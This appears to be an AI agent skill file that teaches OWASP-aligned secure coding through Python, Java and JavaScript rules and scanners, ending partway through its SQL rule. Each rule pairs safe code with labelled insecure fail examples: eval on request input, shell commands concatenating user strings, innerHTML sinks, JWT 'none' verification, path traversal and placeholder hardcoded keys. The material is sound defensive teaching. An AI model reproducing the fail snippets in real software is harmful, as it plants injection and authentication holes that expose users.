---
name: abd-secure-code
catalog_garden_tier: practice
catalog_garden_family: architecture-centric-engineering
catalog_garden_order: 65
catalogue_one_liner: >-
  OWASP-aligned secure coding rules and Python/Java/JavaScript scanners — write
  and prove security-sensitive production code before merge.
description: Generate and validate secure production code with OWASP-aligned rules and language-specific scanners for Python, Java, and JavaScript (Node.js and client-side).
---
# abd-secure-code

## Purpose

Engineers ship features faster than attackers find gaps — but only when secure defaults are explicit, reviewable, and mechanically checkable. This skill packages Secure Code Warrior guidance into concrete coding rules and automated scanners so teams and agents can **write** security-sensitive code and **prove** it meets the same bar before merge.

## When to use this skill

- You are **implementing** authentication, persistence, file handling, crypto, or user-rendered content.
- You are in the **GREEN** phase after acceptance tests and need production code that passes secure-code scanners.
- You are **reviewing** a pull request for OWASP Top 10 categories covered by this package.
- An agent is asked to "make this secure", "fix SQL injection", "hash passwords correctly", or "run secure code scanners".

## Core concepts

### Threat-informed defaults

Each rule maps to a **real failure mode** from the Secure Code Warrior corpus (injection, cryptographic failure, unsafe deserialization, mass assignment, information disclosure). Secure code is not a separate checklist bolted on at the end — it is how you handle **untrusted input**, **secrets**, **errors**, and **output encoding** in normal production modules.

### Parameterized data access

Databases, shells, and HTML parsers must receive **data as data**. SQL uses bound parameters; shell invocation uses argument arrays; browser output uses escaping or sanitization. Concatenating or interpolating untrusted strings into executable contexts is the common root of injection flaws.

### Secrets and verifiers

**Secrets** (API keys, private keys) never belong in source control. **Passwords** are one-way verifiers — store adaptive hashes with salts, not plaintext or reversible encryption. **Tokens** and session identifiers require cryptographically secure randomness.

### Fail safe to users, verbose to logs

Clients see generic errors with a correlation id. Operators and incident response see stack traces, query errors, and security events in protected logs — not in HTTP responses.

### Rules and scanners

**`rules/*.md`** state pass/fail conditions grounded in **`context/`** sources (cheat sheets, exercises, green belt challenges). **`scanners/python/`**, **`scanners/java/`**, and **`scanners/javascript/`** enforce the same rule stems mechanically (AST or pattern checks). Run every language folder that matches files in the engagement workspace.

### Language stacks

| Stack | Scanner folder | Typical paths |
| --- | --- | --- |
| Python (Flask, Django, FastAPI) | `scanners/python/` | `src/`, `server/`, `app/` |
| Java (Spring, Jakarta EE, JDBC) | `scanners/java/` | `src/main/java/`, `server/` |
| Node.js / Express / Nest | `scanners/javascript/` | `server/`, `packages/*/src/` |
| Browser / React / Vue / Angular | `scanners/javascript/` | `client/`, `src/` (XSS, eval, secrets) |

---

## Agent Instructions

1. **Confirm language** — Python, Java, JavaScript/TypeScript (Node or browser), or any combination. Default: detect from changed files under `packages/`, `src/`, `server/`, `client/`, `src/main/java/`.
2. **Read rules before coding** — Open every `rules/*.md` relevant to the story (auth → password + secrets; forms → mass assignment + XSS; DB → SQL).
3. **Implement with secure defaults** — Parameterized queries, hashed passwords, allow-listed updates, sanitized HTML, generic error responses.
4. **Run scanners** — `run_scanners.py` once per language (`python`, `java`, `javascript`) against the engagement workspace.
5. **Fill checklist** — Copy `templates/secure-code-review-checklist.md` for the slice; mark pass/fail per rule.
6. **Re-bundle after rule edits** — From agilebydesign-skills repo: `bundle_rules_into_skill_md.py --skill-root <this skill>`.

---

## Build

1. **Scope the change** — List trust boundaries: HTTP input, files, third-party callbacks, admin-only fields.
2. **Select rules** — Match story behavior to rule files (see table below).
3. **Author production code** — Apply DO patterns from each rule; avoid DO NOT anti-patterns.
4. **Self-review (AI pass)** — Re-read output against each applicable rule before scanners.
5. **Run language scanners** — See **Validate**.
6. **Document residual risk** — Note rules marked n/a and any manual-only controls (rate limiting, WAF, CSP headers).

### Rule map (OWASP themes)

| Prefix | Theme | Rule file |
| --- | --- | --- |
| **if** | Injection — SQL | `no-sql-string-concatenation.md` |
| **if** | Injection — OS command | `no-os-command-injection.md` |
| **if** | Injection — XSS / script | `no-dangerous-xss-sinks.md`, `no-eval-dynamic-code-execution.md` |
| **if** | Injection — LDAP | `no-ldap-filter-injection.md` |
| **cf** | Cryptographic failures | `no-plaintext-password-storage.md`, `no-plaintext-sensitive-data-at-rest.md`, `no-weak-crypto-algorithms.md`, `no-hardcoded-secrets.md` |
| **af** | Authentication failures | `no-predictable-session-token.md`, `no-insufficient-login-rate-limiting.md`, `no-client-side-auth-trust.md`, `no-jwt-none-algorithm.md` |
| **df** | Integrity / supply chain | `no-unsafe-deserialization.md`, `no-mass-assignment-from-request.md`, `no-untrusted-component-sources.md`, `no-xxe-unsafe-xml-parser.md` |
| **id** | Insecure design | `no-unsafe-file-upload-handling.md`, `no-path-traversal-in-paths.md`, `no-excessive-response-data.md` |
| **ec** | Exceptional conditions | `no-sensitive-error-disclosure.md`, `no-toctou-outside-lock.md` |
| **lf** | Logging failures | `no-secrets-in-log-output.md`, `no-missing-security-event-logging.md` |

**24 rules · 72 scanners** (24 stems × 3 languages). Prefix key: `context/category-index.md` and `inputs/rules-index.json`. Pattern definitions live in `scanners/common/pattern_catalog.py`; regenerate language entrypoints with `scanners/common/generate_scanners.py` after catalog edits.

### Context corpus

Authoritative training material: **`secure-code-warrior`** repo `context/` (see `inputs/corpus-root.json` and `inputs/context-retrieval.md`). Regression fixtures live under that repo’s `fixtures/`. Use **`context/green_belt_assessment/`** challenges and **`context/*/exercises-challenges/`** when extending rules.

---

## Example

**Story:** Register customer account with email and password.

```python
# server/auth/register.py — secure pattern
from argon2 import PasswordHasher

_ph = PasswordHasher()


def register_user(repo, email: str, password: str) -> None:
    if repo.find_by_email(email):
        raise DuplicateEmailError("This email is already in use")
    password_hash = _ph.hash(password)
    repo.insert(email=email, password_hash=password_hash)
```

```javascript
// server/routes/register.js — secure pattern
router.post('/register', async (req, res) => {
  const { email, password } = registrationSchema.parse(req.body);
  const passwordHash = await bcrypt.hash(password, 12);
  await users.insert({ email, passwordHash });
  res.status(201).json({ message: 'Check your email to verify' });
});
```

```java
// server/auth/RegisterService.java — secure pattern
public void register(UserRepository repo, String email, char[] password) {
    if (repo.findByEmail(email).isPresent()) {
        throw new DuplicateEmailException("This email is already in use");
    }
    String passwordHash = passwordHasher.hash(password);
    repo.insert(email, passwordHash);
}
```

---

## Validate

- [ ] Applicable **rules** read; production code matches **DO** / avoids **DO NOT** examples.
- [ ] **Scanners** run for each language in scope:

```powershell
$runner = "<engagement>/.cursor/skills/execute-skill-using-skills-rules/scripts/run_scanners.py"
$skill  = "<engagement>/.cursor/skills/abd-secure-code"
$ws     = "<engagement-root>"

python $runner --skill-root $skill --workspace $ws --language python
python $runner --skill-root $skill --workspace $ws --language javascript
python $runner --skill-root $skill --workspace $ws --language java
```

- [ ] **`templates/secure-code-review-checklist.md`** filled for the slice (or linked review artifact).
- [ ] **`bundle_rules_into_skill_md.py`** run after any `rules/*.md` edit.
- [ ] Residual manual items (CSP, rate limits, dependency CVEs) documented — out of scanner scope.

---

<!-- execute_rules:bundle_rules:begin -->
### Rule: No client-side auth trust

Authentication state must live server-side or in signed, integrity-protected tokens. Encoding user identity or roles in client-readable cookies (base64 JSON, unsigned blobs) lets attackers forge privileges (CWE-287, OWASP A07).

#### DO

- **DO** keep session state in a server-side store keyed by a random, high-entropy session id.

  **Example (pass):**

  ```javascript
  req.session.userId = user.id;
  req.session.role = user.role;
  ```

- **DO** use signed (and when needed, encrypted) cookies or JWTs with verified signatures and validated claims.

  **Example (pass):**

  ```javascript
  res.cookie('session', signedSessionId, { httpOnly: true, secure: true, signed: true });
  ```

#### DO NOT

- **DO NOT** base64-encode a JSON user object into a cookie and treat it as authoritative on read.

  **Example (fail):**

  ```javascript
  const payload = Buffer.from(JSON.stringify({ role: user.role, id: user.id })).toString('base64');
  res.cookie('user', payload);
  ```

  **Example (fail):**

  ```javascript
  const session = JSON.parse(Buffer.from(req.cookies.user, 'base64').toString());
  if (session.role === 'admin') { /* ... */ }
  ```

- **DO NOT** decode client cookies with `atob` / `Base64.getDecoder()` and trust embedded roles without signature verification.

  **Example (fail):**

  ```java
  String json = new String(Base64.getDecoder().decode(request.getCookie("user").getValue()));
  UserSession session = objectMapper.readValue(json, UserSession.class);
  ```

- **DO NOT** accept client-supplied `isAdmin` or `role` fields without server-side authorization checks.

  **Example (fail):** Trusting `req.body.role` on login to set persistent admin access.

**Source:** `context/07_Authentication_Failures/context/improper-authentication.md`

### Rule: No dangerous XSS sinks

When untrusted content renders in a browser, use framework auto-escaping or context-appropriate encoding. APIs that treat strings as HTML or script bypass defenses and enable cross-site scripting.

#### DO

- **DO** render user content through framework text nodes or escaped templates.

  **Example (pass):** React `{userDisplayName}` in JSX — default escaping applies.

- **DO** sanitize HTML with a maintained library (e.g. DOMPurify) when rich text is required, then assign to a controlled sink.

  **Example (pass):**

  ```javascript
  const clean = DOMPurify.sanitize(userHtml);
  element.textContent = clean; // prefer textContent when HTML not required
  ```

#### DO NOT

- **DO NOT** assign untrusted strings to `innerHTML`, `outerHTML`, or `dangerouslySetInnerHTML`.

  **Example (fail):**

  ```javascript
  div.innerHTML = req.query.message;
  ```

- **DO NOT** disable template auto-escaping without a documented sanitization step.

  **Example (fail):** Jinja `{{ bio | safe }}` where `bio` originates from user input.

**Source:** `context/05-injection-flaws/context/cross-site-scripting-prevention-cheat-sheet.md`

### Rule: No eval or dynamic code execution

`eval`, `exec`, `Function`, and string-form `setTimeout` turn data into code. Any path that executes attacker-influenced strings is remote code execution regardless of language.

#### DO

- **DO** parse structured data with `JSON.parse`, schema validators, or safe parsers — then branch on typed values.

  **Example (pass):**

  ```javascript
  const config = JSON.parse(raw);
  if (typeof config.retries !== 'number') throw new ValidationError('retries');
  ```

- **DO** use sandboxed expression engines only when absolutely required, with strict allow-lists and no filesystem/network.

  **Example (pass):** Dedicated rules engine library configured with a fixed function set — not `eval`.

#### DO NOT

- **DO NOT** call `eval`, `exec`, or `new Function` on request-derived strings.

  **Example (fail):**

  ```javascript
  const result = eval(req.query.expression);
  ```

- **DO NOT** pass string callbacks to timer APIs.

  **Example (fail):** `setTimeout("updateCount(" + n + ")", 1000)`

**Source:** `context/05-injection-flaws/context/cross-site-scripting-prevention-cheat-sheet.md` (unsafe sinks / script execution)

### Rule: No excessive response data

APIs must return only the fields the client is authorized to see. Serializing full domain entities, ORM models, or database rows exposes internal fields, PII, and secrets (CWE-200, OWASP A04).

#### DO

- **DO** map domain objects to DTOs, view models, or serializers with an explicit allow-list before responding.

  **Example (pass):**

  ```javascript
  const user = await users.findById(req.params.id);
  return res.json({ id: user.id, email: user.email, displayName: user.displayName });
  ```

  **Example (pass):**

  ```python
  patient = service.get_patient(patient_id)
  return jsonify(PatientSummary.from_entity(patient))
  ```

  **Example (pass):**

  ```java
  User user = userRepository.findById(id);
  return ResponseEntity.ok(UserResponse.from(user));
  ```

- **DO** use `@JsonView`, field exclusion annotations, or schema-driven serializers when returning nested graphs.

  **Example (pass):** Public profile endpoint returns `UserPublicView` only — no `ssn`, `passwordHash`, or internal flags.

#### DO NOT

- **DO NOT** return the full persisted entity to HTTP clients.

  **Example (fail):**

  ```javascript
  const user = await User.findById(req.params.id);
  res.json(user);
  ```

- **DO NOT** serialize ORM `to_dict()` / `__dict__` output without filtering.

  **Example (fail):**

  ```python
  return jsonify(user.__dict__)
  ```

- **DO NOT** send raw database rows or JPA entities in REST responses.

  **Example (fail):**

  ```java
  return ResponseEntity.ok(userRepository.findById(id).get());
  ```

**Source:** `context/06-Insecure-Design/context/sensitive-data-exposure.md`

### Rule: No hardcoded secrets

Secrets, API keys, private keys, connection strings, and long-lived tokens must not live in source control. Configuration belongs in environment variables, a secret manager (Vault, AWS Secrets Manager, Azure Key Vault), or runtime injection — never as string literals in application code (CWE-798, OWASP A02).

#### DO

- **DO** load secrets from environment or a secret manager at runtime; fail fast when missing.

  **Example (pass):**

  ```python
  import os
  stripe_key = os.environ["STRIPE_SECRET_KEY"]
  ```

  **Example (pass):**

  ```javascript
  const stripeKey = process.env.STRIPE_SECRET_KEY;
  if (!stripeKey) throw new Error('STRIPE_SECRET_KEY not configured');
  ```

  **Example (pass):**

  ```java
  String dbPassword = System.getenv("DB_PASSWORD");
  if (dbPassword == null) throw new IllegalStateException("DB_PASSWORD not configured");
  ```

- **DO** rotate credentials that were ever committed; treat the old value as compromised.

  **Example (pass):** CI runs gitleaks/trufflehog on every pull request; pipeline fails on new secret patterns.

- **DO** use short-lived tokens and workload identity (IAM roles, managed identities) instead of long-lived keys where the platform supports it.

  **Example (pass):** AWS SDK uses instance/task role credentials — no static access key in code.

#### DO NOT

- **DO NOT** assign real passwords, API keys, Stripe keys, or private key PEM blocks in source files.

  **Example (fail):**

  ```python
  API_KEY = "sk_live_EXAMPLE_KEY_DO_NOT_USE_1234567890"
  ```

- **DO NOT** embed AWS access key ids, GitHub tokens, Slack tokens, or JWT signing secrets in repositories — including "dev only" branches.

  **Example (fail):**

  ```javascript
  const accessKey = 'AKIAIOSFODNN7EXAMPLE';
  const secret = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
  ```

- **DO NOT** commit database connection strings with embedded passwords.

  **Example (fail):**

  ```java
  String url = "postgresql://admin:SuperSecret@db.internal:5432/prod";
  ```

**Source:** `context/04-cryotiographic-failures/context/sensitive-data-exposure.md`

### Rule: No insufficient login rate limiting

Authentication endpoints must resist credential stuffing and brute force: per-IP and per-account rate limits, progressive delays, lockouts, and structured logging of failures (CWE-307, OWASP A07). A login handler with no throttling fails this rule.

#### DO

- **DO** enforce rate limits and progressive backoff on login, password reset, and MFA endpoints.

  **Example (pass):**

  ```javascript
  app.post('/login', loginRateLimiter, captchaWhenSuspicious, async (req, res) => {
    await recordAuthAttempt({ ip: req.ip, username: req.body.email, outcome });
  });
  ```

  **Example (pass):**

  ```python
  @limiter.limit("5 per minute")
  def login(request):
      audit_log.info("auth_attempt", extra={"ip": request.META["REMOTE_ADDR"]})
  ```

- **DO** return generic errors (`Invalid username or password`) — same message for unknown user and bad password.

  **Example (pass):** Single error string regardless of which check failed.

#### DO NOT

- **DO NOT** expose login endpoints with unlimited attempts and no monitoring.

  **Example (fail):**

  ```javascript
  app.post('/login', async (req, res) => {
    const user = await db.findByEmail(req.body.email);
    if (!user || !(await bcrypt.compare(req.body.password, user.hash))) {
      return res.status(401).json({ error: 'invalid' });
    }
  });
  ```

- **DO NOT** reveal account existence through different error messages or timing on login failure.

  **Example (fail):** `User not found` vs `Wrong password` responses.

**Source:** `context/green_belt_assessment/e0523/challenge-3.md`, `context/07_Authentication_Failures/context/insufficient-anti-automation.md`

### Rule: No JWT none algorithm

JSON Web Tokens must be verified with an explicit allow-list of strong algorithms. Accepting `alg: none`, skipping signature verification, or verifying with a null secret enables token forgery (CWE-347, OWASP A07).

#### DO

- **DO** verify JWTs with HMAC-SHA256/384/512 or asymmetric algorithms (RS256, ES256) and a configured secret or public key.

  **Example (pass):**

  ```javascript
  const payload = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
  ```

  **Example (pass):**

  ```python
  jwt.decode(token, key, algorithms=["RS256"], audience="api.example.com")
  ```

  **Example (pass):**

  ```java
  Jwts.parserBuilder().setSigningKey(publicKey).requireAudience("api").build().parseClaimsJws(token);
  ```

- **DO** reject tokens whose header algorithm is not on the allow-list.

  **Example (pass):** Middleware returns 401 when `alg` is missing or not in configured algorithms.

#### DO NOT

- **DO NOT** verify JWTs with `algorithms: ['none']` or equivalent.

  **Example (fail):**

  ```javascript
  jwt.verify(token, null, { algorithms: ['none'] });
  ```

- **DO NOT** decode JWT payload without signature verification for authentication decisions.

  **Example (fail):**

  ```python
  payload = jwt.decode(token, options={"verify_signature": False})
  ```

- **DO NOT** sign tokens with `algorithm: 'none'`.

  **Example (fail):**

  ```javascript
  jwt.sign({ sub: user.id }, null, { algorithm: 'none' });
  ```

**Source:** `context/07_Authentication_Failures/context/improper-authentication.md`

### Rule: No LDAP filter injection

LDAP search filters must treat user input as data, not filter syntax. Substituting untrusted values into filter strings like `(email={0})` without RFC 4515 escaping enables filter injection — attackers can broaden queries to return all directory entries (CWE-90, OWASP A03).

#### DO

- **DO** escape LDAP filter special characters (`*`, `(`, `)`, `\`, NUL) per RFC 4515 before substitution.

  **Example (pass):**

  ```java
  String safeEmail = LdapEncoder.filterEncode(email);
  String filter = "(mail=" + safeEmail + ")";
  ctx.search(baseDn, filter, controls);
  ```

  **Example (pass):**

  ```python
  from ldap3.utils.conv import escape_filter_chars
  safe = escape_filter_chars(email)
  conn.search(base, f"(mail={safe})", attributes=attrs)
  ```

- **DO** use library APIs that guarantee parameterized filter escaping — verify in docs, do not assume `{0}` templates escape automatically.

  **Example (pass):** Spring LDAP `EqualsFilter("mail", email)` builds a safe filter internally.

#### DO NOT

- **DO NOT** pass raw user input into MessageFormat-style LDAP filters without escaping.

  **Example (fail):**

  ```java
  ldapTemplate.search("(email=" + email + ")", handler);
  ```

- **DO NOT** build LDAP filters via string concatenation with request parameters.

  **Example (fail):**

  ```javascript
  const filter = `(uid=${req.query.username})`;
  client.search(baseDN, { filter });
  ```

**Source:** `context/green_belt_assessment/e0523/challenge-9.md`, `context/05-injection-flaws/context/guideline-sql-injection.md` (injection family)

### Rule: No mass assignment from request

HTTP request bodies are untrusted input. Blindly copying every field into persistence models lets attackers set privileged attributes (`role`, `isAdmin`, `accountVerified`) unless each update uses an explicit allow-list.

#### DO

- **DO** map allowed fields explicitly from DTO to entity.

  **Example (pass):**

  ```javascript
  await User.update(userId, {
    displayName: body.displayName,
    timezone: body.timezone,
  });
  ```

- **DO** use schema validation (Zod, Joi, pydantic) that strips or rejects unknown keys before persistence.

  **Example (pass):** `profileUpdateSchema.parse(req.body)` with `.strict()` or known field set.

#### DO NOT

- **DO NOT** spread or assign entire `req.body` / `request.json` into ORM update/create.

  **Example (fail):**

  ```javascript
  await User.findByIdAndUpdate(id, req.body);
  ```

- **DO NOT** unpack request dicts into model constructors without filtering.

  **Example (fail):**

  ```python
  User(**request.json)
  ```

- **DO NOT** bind entire request maps into entities without an allow-list.

  **Example (fail):**

  ```java
  BeanUtils.populate(product, request.getParameterMap());
  ```

**Source:** `context/08_Software_or_Data_Integrity_Failures/context/mass-assignment.md`, `context/08_Software_or_Data_Integrity_Failures/exercises-challenges/mass-assigment-challenge.md`

### Rule: No missing security event logging

Authentication and authorization outcomes must be recorded for detection and investigation. Failed logins, successful logins, logout, token issuance, and privilege changes need structured audit entries — not silent returns (CWE-778, OWASP A09).

#### DO

- **DO** log authentication events with event type, actor identifier, outcome, and request correlation id — without credential material.

  **Example (pass):**

  ```javascript
  if (!valid) {
    logger.warn({ event: 'login_failed', userId: email, requestId, outcome: 'invalid_password' });
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  logger.info({ event: 'login_success', userId: user.id, requestId });
  ```

  **Example (pass):**

  ```python
  if not verify_password(user, password):
      logger.warning(
          "authentication_failed",
          extra={"user_id": user_id, "request_id": request_id, "outcome": "invalid_password"},
      )
      raise AuthenticationError("Invalid credentials")
  ```

- **DO** log authorization failures and privilege elevation with the same structured fields.

  **Example (pass):** `audit.log("role_changed", actor=admin_id, target=user_id, new_role="support")`

#### DO NOT

- **DO NOT** handle login or logout without any security audit log in the handler.

  **Example (fail):**

  ```javascript
  app.post('/login', async (req, res) => {
    const ok = await verify(req.body.email, req.body.password);
    res.json({ ok });
  });
  ```

- **DO NOT** return authentication failure to the client without recording the attempt.

  **Example (fail):**

  ```java
  if (!passwordEncoder.matches(raw, user.getPasswordHash())) {
      return ResponseEntity.status(401).build();
  }
  ```

- **DO NOT** rely on generic application logs that omit event type and outcome for security flows.

  **Example (fail):** `log.debug("bad login")` with no structured security event field.

**Source:** `context/09_Logging_Alerting_Failures/context/insufficient-logging-and-monitoring.md`, `context/09_Logging_Alerting_Failures/exercises-challenges/insufficient-logging-and-monitoring-challenge.md`

### Rule: No OS command injection

When code must invoke operating-system programs, pass arguments as an array without a shell intermediary. Building shell commands from user input enables metacharacter injection (`;`, `|`, `` ` ``, `$()`) — CWE-78, CWE-88, OWASP A03.

#### DO

- **DO** use subprocess / spawn with an argument array and `shell=False` (default in Python 3).

  **Example (pass):**

  ```python
  subprocess.run(["convert", input_path, output_path], check=True)
  ```

  **Example (pass):**

  ```javascript
  const { spawn } = require('child_process');
  spawn('ffmpeg', ['-i', inputPath, outputPath]);
  ```

  **Example (pass):**

  ```java
  new ProcessBuilder("convert", inputPath, outputPath).start();
  ```

- **DO** validate and allow-list any value that still must influence command selection (host, format enum).

  **Example (pass):** Map `format=pdf` to internal enum before choosing converter binary — never pass raw user string as executable name.

- **DO** run with least privilege; log command invocations without secrets.

  **Example (pass):** Dedicated service account without shell login; audit log records argv array.

#### DO NOT

- **DO NOT** pass user input into `shell=True` subprocess calls or shell-wrapped exec.

  **Example (fail):**

  ```python
  subprocess.run(f"grep {user_term} /var/log/app.log", shell=True)
  ```

- **DO NOT** concatenate untrusted strings into `os.system`, `child_process.exec`, or `Runtime.exec`.

  **Example (fail):**

  ```javascript
  exec('ffmpeg -i ' + req.query.file);
  ```

  **Example (fail):**

  ```java
  Runtime.getRuntime().exec("ping " + userIp);
  ```

- **DO NOT** rely on character blacklists to "sanitize" shell arguments — use structured argv or avoid shell entirely.

  **Example (fail):** Stripping `;` and `|` then passing remainder to `bash -c`.

**Source:** `context/05-injection-flaws/context/os-command-injection.md`, `context/05-injection-flaws/exercises-challenges/os-command-injection.md`

### Rule: No path traversal in paths

When user input influences filesystem paths, validate and normalize before open/read/write. Traversal sequences (`../`) and absolute paths let attackers read or overwrite files outside the intended directory (CWE-22).

#### DO

- **DO** resolve paths under a fixed base directory and reject if the result escapes the base.

  **Example (pass):**

  ```python
  base = UPLOAD_ROOT.resolve()
  target = (base / safe_filename).resolve()
  if not str(target).startswith(str(base)):
      raise PathTraversalError("invalid path")
  ```

  **Example (pass):**

  ```javascript
  const base = path.resolve(UPLOAD_DIR);
  const target = path.resolve(base, safeName);
  if (!target.startsWith(base + path.sep)) {
    throw new Error('path traversal');
  }
  ```

  **Example (pass):**

  ```java
  Path base = uploadRoot.toRealPath();
  Path target = base.resolve(safeName).normalize();
  if (!target.startsWith(base)) {
      throw new SecurityException("path traversal");
  }
  ```

- **DO** reject filenames containing path separators or `..` before mapping to storage keys.

  **Example (pass):** Allow-list `[a-zA-Z0-9._-]+` for user-visible download ids; map to internal UUID.

#### DO NOT

- **DO NOT** concatenate request parameters into filesystem paths without normalization.

  **Example (fail):**

  ```python
  open(os.path.join("/data/reports", request.args["name"]))
  ```

- **DO NOT** pass raw `getParameter` / `req.params` values to `File`, `Paths.get`, or `fs.readFile`.

  **Example (fail):**

  ```java
  new File("/uploads/" + request.getParameter("file"));
  ```

- **DO NOT** decode `%2e%2e%2f` once and skip further validation — normalize and compare to base.

  **Example (fail):**

  ```javascript
  fs.readFileSync(path.join(STORAGE, req.query.path));
  ```

**Source:** `context/06-Insecure-Design/context/unrestricted-file-upload.md`, `context/05-injection-flaws/context/unrestricted-file-upload.md`

### Rule: No plaintext password storage

Passwords are verifier secrets — store only adaptive password hashes with per-password salts (and optional pepper in KMS). Plaintext, reversible encryption, or fast unsalted digests of passwords fail this rule (CWE-256, OWASP A02).

#### DO

- **DO** hash passwords with Argon2id (preferred), scrypt, bcrypt, or PBKDF2-HMAC-SHA256 before persistence.

  **Example (pass):**

  ```python
  from argon2 import PasswordHasher
  password_hash = PasswordHasher().hash(password)
  db.save_user(email=email, password_hash=password_hash)
  ```

  **Example (pass):**

  ```javascript
  const passwordHash = await bcrypt.hash(password, 12);
  await users.insert({ email, passwordHash });
  ```

  **Example (pass):**

  ```java
  String hash = passwordEncoder.encode(rawPassword);
  userRepository.save(new User(email, hash));
  ```

- **DO** store algorithm identifier and cost parameters with each hash for future upgrades (PHC string or structured record).

  **Example (pass):** `$argon2id$v=19$m=47104,t=1,p=1$...` stored in `password_hash` column.

- **DO** re-hash on successful login when work factors are below current policy.

  **Example (pass):** After `verify`, if cost parameter is outdated, `upgrade_hash()` and persist new PHC string.

#### DO NOT

- **DO NOT** persist the registration password field as-is from the request body.

  **Example (fail):**

  ```javascript
  await User.create({ email, password: req.body.password });
  ```

  **Example (fail):**

  ```java
  user.setPassword(request.getParameter("password"));
  ```

- **DO NOT** log or echo submitted passwords during authentication flows.

  **Example (fail):**

  ```python
  logger.info("login attempt", extra={"email": email, "password": password})
  ```

- **DO NOT** use MD5, SHA1, or single-round SHA256 without salt for password storage.

  **Example (fail):**

  ```python
  stored = hashlib.sha256(password.encode()).hexdigest()
  ```

**Source:** `context/04-cryotiographic-failures/context/password-storage-cheat-sheet.md`

### Rule: No plaintext sensitive data at rest

PII and regulated data (SSN, tax id, payment identifiers, health records) must be encrypted, tokenized, or otherwise protected before persistence. Plaintext storage in application databases or files fails this rule — distinct from password hashing (CWE-312, OWASP A02).

#### DO

- **DO** encrypt or tokenize sensitive fields with envelope encryption or a KMS-backed data key before insert/update.

  **Example (pass):**

  ```python
  encrypted_ssn = field_encryptor.encrypt(ssn, key_id=PII_KEY)
  db.save_user(email=email, ssn_ciphertext=encrypted_ssn)
  ```

  **Example (pass):**

  ```javascript
  const token = await vault.tokenize('ssn', ssn);
  await users.insert({ email, ssnToken: token });
  ```

  **Example (pass):**

  ```java
  String ciphertext = piiCipher.encrypt(rawSsn);
  userRepository.save(new User(email, ciphertext));
  ```

- **DO** store algorithm, key id, and version metadata needed for rotation and decryption.

  **Example (pass):** Column `ssn_ciphertext` plus `encryption_key_id` and `cipher_version`.

#### DO NOT

- **DO NOT** persist SSN, card numbers, or national ids from the request body without encryption.

  **Example (fail):**

  ```javascript
  await Profile.create({ userId, ssn: req.body.ssn });
  ```

  **Example (fail):**

  ```python
  db.execute("INSERT INTO users (ssn) VALUES (%s)", (request.form["ssn"],))
  ```

  **Example (fail):**

  ```java
  user.setSsn(request.getParameter("ssn"));
  userRepository.save(user);
  ```

- **DO NOT** store reversible “encoding” (base64, hex) instead of cryptographic protection.

  **Example (fail):** `stored = base64.b64encode(ssn.encode())` without encryption.

**Source:** `context/04-cryotiographic-failures/exercises-challenges/sensitive-data-storage-plain-text-storage-of-sensitive-info.md`, `context/04-cryotiographic-failures/context/password-storage-cheat-sheet.md`

### Rule: No predictable session token

Session identifiers and authentication tokens must be generated with a cryptographically secure random number generator (CSPRNG) and sufficient entropy (128+ bits). Predictable session ids enable session hijacking, account takeover, and horizontal privilege escalation.

#### DO

- **DO** use the framework session manager or `secrets` / `crypto.randomBytes` / `SecureRandom` for session id generation.

  **Example (pass):**

  ```python
  import secrets
  session_id = secrets.token_urlsafe(32)
  session_store.save(session_id, user_id)
  ```

  **Example (pass):**

  ```javascript
  req.session.regenerate((err) => {
    // express-session generates high-entropy id server-side
  });
  ```

  **Example (pass):**

  ```java
  String sessionId = UUID.randomUUID().toString();
  sessionRepository.create(sessionId, userId);
  ```

- **DO** rotate session id on login, privilege elevation, and logout; enforce idle and absolute timeouts server-side.

  **Example (pass):** Invalidate server-side session record on logout; issue new session id after successful authentication.

#### DO NOT

- **DO NOT** derive session ids from username, email, or numeric user id.

  **Example (fail):**

  ```javascript
  req.session.id = req.body.username;
  ```

- **DO NOT** use incrementing counters, small random ranges, or `Math.random()` for session tokens.

  **Example (fail):**

  ```java
  sessionId = String.valueOf(random.nextInt(100000));
  ```

**Source:** `context/07_Authentication_Failures/context/improper-authentication.md`, `context/07_Authentication_Failures/exercises-challenges/weak-session-token-generation.md`

See also: **no-jwt-none-algorithm**, **no-client-side-auth-trust** for token verification and client-side session state.

### Rule: No secrets in log output

Logs often flow to centralized systems with broad access. Passwords, API keys, session tokens, and Authorization headers must never appear in log lines — even during debugging (CWE-532, OWASP A09).

#### DO

- **DO** log security events with structured fields: event type, actor id, outcome, request id — not credential material.

  **Example (pass):**

  ```javascript
  logger.info({
    event: 'login_failed',
    userId: user.id,
    requestId: ctx.requestId,
    outcome: 'invalid_password',
  });
  ```

  **Example (pass):**

  ```python
  logger.warning(
      "authentication_failed",
      extra={"user_id": user_id, "request_id": request_id},
  )
  ```

- **DO** mask or omit token and session fields; hash session ids if correlation requires it.

  **Example (pass):** Log `session_id_prefix=abc123…` (first 8 chars) only in debug tiers with RBAC.

#### DO NOT

- **DO NOT** log raw passwords, API keys, or Authorization header values.

  **Example (fail):**

  ```python
  logger.info("login attempt", extra={"email": email, "password": password})
  ```

- **DO NOT** log full JWT or reset tokens in info-level production logs.

  **Example (fail):**

  ```javascript
  console.log('token issued', { token: jwt });
  ```

- **DO NOT** print secrets to stdout/stderr in production code paths.

  **Example (fail):**

  ```java
  log.info("API call with key {}", apiKey);
  ```

**Source:** `context/09_Logging_Alerting_Failures/context/insufficient-logging-and-monitoring.md`

### Rule: No sensitive error disclosure

Error responses shown to end users must be generic. Detailed stack traces, framework versions, and file paths belong in secure internal logs correlated by request id — not in HTTP bodies.

#### DO

- **DO** return a stable user message plus opaque reference id; log full diagnostics server-side.

  **Example (pass):**

  ```javascript
  logger.error({ requestId, err });
  res.status(500).json({ message: 'An internal error occurred', reference: requestId });
  ```

- **DO** disable framework debug pages in production deployments.

  **Example (pass):** `app.set('env', 'production')` with centralized exception handler.

#### DO NOT

- **DO NOT** send `err.stack`, Python tracebacks, or SQL error text to clients.

  **Example (fail):**

  ```javascript
  res.status(500).send(err.stack);
  ```

- **DO NOT** enable verbose SQL or ORM logging that echoes to API responses.

  **Example (fail):** Returning `{ error: dbError.detail }` from a catch block on login failure.

**Source:** `context/10_Mishandling_of_Exceptional_Conditions/context/error-details.md`

### Rule: No SQL string concatenation

Production database access must separate SQL structure from user-supplied data. Passing through bound parameters or an ORM's safe API passes; building SQL with string concatenation, f-strings, or `.format()` with untrusted values fails because the database cannot distinguish code from data.

#### DO

- **DO** use parameterized queries / prepared statements for every dynamic value in SQL.

  **Example (pass):**

  ```python
  cur.execute("SELECT balance FROM accounts WHERE user_name = %s", (customer_name,))
  ```

